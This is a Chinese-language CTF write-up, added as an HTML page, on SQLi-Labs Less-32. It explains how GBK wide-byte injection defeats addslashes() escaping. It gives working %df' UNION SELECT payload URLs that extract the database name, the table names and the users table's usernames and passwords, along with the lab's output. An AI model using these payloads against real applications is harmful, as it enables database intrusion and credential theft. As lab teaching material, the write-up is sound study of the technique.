@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-32 宽字节注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-32 宽字节注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.27 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 宽字节注入</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-32 (GET - Bypass addslashes)</li>
+        <li><strong>提示：</strong>页面回显了输入字符串的转义结果及十六进制编码。单引号被转义，需使用宽字节绕过。</li>
+    </ul>
+
+    <h2>2. 核心原理：GBK 宽字节注入</h2>
+    <p>本关卡的核心考点是绕过 <code>addslashes()</code> 等转义函数的防御。后台代码通常为 <code>id='$id'</code>，并且执行了 <code>SET NAMES gbk</code> 将数据库连接字符集设置为 GBK。</p>
+    <ul>
+        <li><strong>常规防御（转义）</strong>：当输入单引号 <code>'</code>（十六进制 <code>0x27</code>）时，后端函数会在其前面加上反斜杠 <code>\</code>（十六进制 <code>0x5C</code>）进行转义，变为 <code>0x5C 0x27</code>。这使得单引号失去闭合能力。</li>
+        <li><strong>宽字节绕过</strong>：GBK 是一种双字节编码，第一个字节（高位）范围是 <code>0x81-0xFE</code>，第二个字节（低位）范围是 <code>0x40-0xFE</code>。当我们输入 <code>%df'</code>（十六进制 <code>0xDF 0x27</code>）时，后端转义变为 <code>0xDF 0x5C 0x27</code>。
+        此时，<code>0xDF</code> 和 <code>0x5C</code> 被 GBK 解析器组合成了一个合法的汉字（如“運”），反斜杠 <code>0x5C</code> 被“吃掉”，导致后面的单引号 <code>0x27</code> 成功逃逸，闭合了 SQL 语句。</li>
+    </ul>
+
+    <h2>3. 操作步骤与解析</h2>
+    
+    <p><strong>第一步：验证字节层面的转义</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=1%df'</code></p>
+    <p><strong>回显现象：</strong>页面底部提示 <code>The Query String you input in Hex becomes : 31 df 5c 27</code>。</p>
+    <p><strong>解释与原理：</strong><code>31</code> 对应字符 `1`，<code>df</code> 是输入的高位字节，<code>5c</code> 是转义加入的反斜杠，<code>27</code> 是单引号。这说明转义确实发生，且 <code>df</code> 与 <code>5c</code> 紧挨着，满足了宽字节解析的条件。</p>
+
+    <p><strong>第二步：联合查询爆库名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1%df' union select 1,2,database()-- -</code></p>
+    <p><strong>回显现象：</strong>页面第 2 列回显 <code>security</code>。</p>
+    <p><strong>解释与原理：</strong><code>%df'</code> 成功闭合前面的单引号。使用 <code>-1</code> 作为占位符使前置查询为空，通过 <code>UNION SELECT</code> 输出当前数据库名。</p>
+
+    <p><strong>第三步：联合查询爆表名</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- -</code></p>
+    <p><strong>回显现象：</strong>页面回显 <code>emails,referrers,uagents,users</code>。</p>
+
+    <p><strong>第四步：联合查询脱库</strong></p>
+    <p><strong>输入 URL：</strong><code>?id=-1%df' union select 1,2,group_concat(username,0x3a,password) from users-- -</code></p>
+    <p><strong>回显现象：</strong>页面回显所有账号密码的拼接字符串，包含 <code>Dumb:Dumb</code>、<code>admin:p@ssw0rd</code> 等。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>URL 编码陷阱</strong>：在浏览器地址栏或 Burp 的 Raw 面板中，必须直接发送原始字节 <code>%df</code>。如果使用某些工具（如 curl 的 <code>--data-urlencode</code>），会导致 <code>%</code> 被二次编码为 <code>%25</code>，发送的就不再是原始字节，宽字节注入失效。</li>
+        <li><strong>闭合符与注释符</strong>：宽字节注入的闭合符依然是单引号，接在 <code>%df</code> 后面即可。注释符使用 <code>-- -</code> 或 <code>#</code>，注意 URL 编码格式（<code>--%20-</code> 或 <code>%23</code>）。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>宽字节注入 (Wide Byte Injection)</strong>：利用数据库连接字符集（如 GBK）的双字节解析特性，通过输入特定的高位字节“吃掉”转义符，使单引号逃逸。</li>
+        <li><strong>十六进制与字节流</strong>：理解了 SQL 注入在底层本质上是字节流的拼接与解析，而非表层字符串的简单替换。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
